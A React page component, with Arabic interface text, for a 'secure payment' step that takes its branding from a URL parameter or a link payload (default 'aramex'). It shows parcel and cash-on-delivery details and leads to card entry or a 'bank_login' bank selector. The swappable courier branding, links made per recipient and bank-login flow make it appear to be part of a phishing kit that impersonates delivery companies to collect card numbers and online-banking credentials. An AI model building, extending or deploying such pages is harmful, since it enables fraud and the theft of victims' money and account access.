import { useParams, useNavigate } from "react-router-dom";
import { useLink } from "@/hooks/useSupabase";
import { formatCurrency } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package } from "lucide-react";
import { useTheme } from "@/themes/ThemeContext";

const PaymentDetailsOfficial = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const { theme } = useTheme();

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);

  const handleProceed = () => {
    // Check payment method from link data
    const paymentMethod = shippingInfo?.payment_method || 'card';

    // If payment method is "card", skip bank selector and go directly to card input
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card`);
    } else {
      // For "bank_login" method, show bank selector
      navigate(`/pay/${id}/bank-selector`);
    }
  };

  return (
    <div
      className="min-h-screen"
      style={{
        background: 'var(--color-background)',
        fontFamily: 'var(--font-family)',
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b"
        style={{
          backgroundColor: 'var(--color-surface)',
          borderBottomColor: 'var(--color-border)',
          height: 'var(--header-height)',
          padding: 'var(--header-padding)',
          boxShadow: 'var(--header-box-shadow)',
        }}
      >
        <div className="container mx-auto h-full flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <img
              src={theme?.logo}
              alt={serviceName}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: 'var(--color-text)' }}>
              {serviceName}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
              خدمة الدفع الآمن
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: 'var(--gradient)',
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
            style={{
              backgroundColor: 'var(--color-surface)',
              borderColor: 'var(--color-border)',
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: 'var(--color-text)' }}
              >
                الخطوة 2 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: 'var(--color-text-secondary)' }}
              >
                {serviceName}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '50%',
                  background: 'var(--gradient)',
                }}
              />
            </div>
          </div>

          {/* Content Card */}
          <div
            className="border rounded-xl p-6 sm:p-8 mb-6"
            style={{
                backgroundColor: 'var(--color-surface)',
                borderColor: 'var(--color-border)',
                borderRadius: 'var(--card-border-radius)',
                padding: 'var(--card-padding)',
                border: 'var(--card-border)',
            }}
          >
            {/* Shipping Info Display */}
            {shippingInfo && (
              <div className="mb-6 sm:mb-8">
                <h3
                  className="font-bold mb-4 text-base sm:text-lg"
                  style={{ color: 'var(--color-text)' }}
                >
                  تفاصيل الشحنة
                </h3>
                <div className="space-y-3">
                  {shippingInfo.tracking_number && (
                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `rgba(var(--color-primary-rgb), 0.08)` }}>
                      <Hash className="w-5 h-5" style={{ color: 'var(--color-primary)' }} />
                      <div className="flex-1">
                        <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                          رقم الشحنة:
                        </div>
                        <div className="font-bold text-sm" style={{ color: 'var(--color-text)' }}>
                          {shippingInfo.tracking_number}
                        </div>
                      </div>
                    </div>
                  )}
                  {shippingInfo.package_description && (
                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `rgba(var(--color-primary-rgb), 0.08)` }}>
                      <Package className="w-5 h-5" style={{ color: 'var(--color-primary)' }} />
                      <div className="flex-1">
                        <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                          وصف الطرد:
                        </div>
                        <div className="font-bold text-sm" style={{ color: 'var(--color-text)' }}>
                          {shippingInfo.package_description}
                        </div>
                      </div>
                    </div>
                  )}
                  {shippingInfo.cod_amount > 0 && (
                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `rgba(var(--color-primary-rgb), 0.08)` }}>
                      <DollarSign className="w-5 h-5" style={{ color: 'var(--color-primary)' }} />
                      <div className="flex-1">
                        <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                          مبلغ COD:
                        </div>
                        <div className="font-bold text-sm" style={{ color: 'var(--color-text)' }}>
                          {formatCurrency(shippingInfo.cod_amount, countryCode)}
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Payment Summary */}
            <div className="border-t pt-6" style={{ borderColor: 'var(--color-border)' }}>
              <h3
                className="font-bold mb-4 text-base sm:text-lg"
                style={{ color: 'var(--color-text)' }}
              >
                ملخص الدفعة
              </h3>

              <div className="space-y-4">
                <div className="flex justify-between py-3 border-b" style={{ borderColor: 'var(--color-border)' }}>
                  <span
                    className="text-sm sm:text-base"
                    style={{ color: 'var(--color-text-secondary)' }}
                  >
                    الخدمة
                  </span>
                  <span
                    className="font-semibold text-sm sm:text-base"
                    style={{ color: 'var(--color-text)' }}
                  >
                    {serviceName}
                  </span>
                </div>

                <div
                  className="flex justify-between items-center p-4 sm:p-5 rounded-lg border-2"
                  style={{
                    background: `linear-gradient(135deg, rgba(var(--color-primary-rgb), 0.08), rgba(var(--color-secondary-rgb), 0.08))`,
                    borderColor: 'var(--color-primary)',
                  }}
                >
                  <span
                    className="text-base sm:text-lg font-bold"
                    style={{ color: 'var(--color-text)' }}
                  >
                    المبلغ الإجمالي
                  </span>
                  <span
                    className="text-xl sm:text-2xl font-bold"
                    style={{ color: 'var(--color-primary)' }}
                  >
                    {formattedAmount}
                  </span>
                </div>
              </div>
            </div>

            {/* Payment Method */}
            <div className="mt-6 sm:mt-8">
              <h3
                className="font-bold mb-4 text-base sm:text-lg"
                style={{ color: 'var(--color-text)' }}
              >
                طريقة الدفع
              </h3>
              <div
                className="border-2 rounded-lg p-4"
                style={{
                  borderColor: 'var(--color-primary)',
                  backgroundColor: `rgba(var(--color-primary-rgb), 0.1)`,
                }}
              >
                <div className="flex items-center gap-3">
                  <CreditCard className="w-6 h-6" style={{ color: 'var(--color-primary)' }} />
                  <div>
                    <p
                      className="font-bold text-sm sm:text-base"
                      style={{ color: 'var(--color-text)' }}
                    >
                      الدفع بالبطاقة
                    </p>
                    <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
                      Visa، Mastercard، Mada
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Proceed Button */}
          <button
            onClick={handleProceed}
            className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
            style={{
              background: 'var(--gradient)',
              padding: 'var(--button-padding)',
              borderRadius: 'var(--button-border-radius)',
              fontWeight: 'var(--button-font-weight)',
              textTransform: 'var(--button-text-transform)',
              fontFamily: 'var(--font-family)',
            }}
          >
            <span>المتابعة للدفع</span>
            <ArrowLeft className="w-5 h-5" />
          </button>

          <p
            className="text-xs text-center mt-4"
            style={{ color: 'var(--color-text-secondary)' }}
          >
            بالمتابعة، أنت توافق على الشروط والأحكام
          </p>
        </div>
      </main>
    </div>
  );
};

export default PaymentDetailsOfficial;
